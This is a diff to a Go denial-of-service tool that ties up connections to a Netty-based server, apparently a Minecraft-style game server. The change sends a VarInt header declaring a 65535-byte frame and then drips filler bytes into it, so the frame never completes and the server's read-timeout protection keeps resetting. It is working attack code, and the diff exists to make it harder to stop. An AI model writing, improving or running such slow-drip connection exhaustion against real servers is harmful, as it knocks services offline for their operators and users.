@@ -78,10 +78,20 @@ func holdConn(conn net.Conn, interval time.Duration, verbose bool) {
 	ticker := time.NewTicker(interval)
 	defer ticker.Stop()
 
+	// On the first tick, declare a 65535-byte frame (VarInt 65535 = 0xFF 0xFF 0x03).
+	// Netty decodes a valid non-zero length and waits for the payload — which never
+	// arrives. Subsequent ticks drip filler bytes into that payload, resetting
+	// ReadTimeoutHandler each time without ever completing the frame.
+	headerSent := false
 	for range ticker.C {
-		// Single byte keeps Netty's ReadTimeoutHandler from firing while
-		// preventing the login sequence from completing.
-		_, err := conn.Write([]byte{0x00})
+		var dribble []byte
+		if !headerSent {
+			dribble = []byte{0xFF, 0xFF, 0x03} // VarInt 65535
+			headerSent = true
+		} else {
+			dribble = []byte{0x00}
+		}
+		_, err := conn.Write(dribble)
 		if err != nil {
 			droppedConns.Add(1)
 			if verbose {
@@ -89,7 +99,7 @@ func holdConn(conn net.Conn, interval time.Duration, verbose bool) {
 			}
 			return
 		}
-		bytesSent.Add(1)
+		bytesSent.Add(int64(len(dribble)))
 	}
 }
 
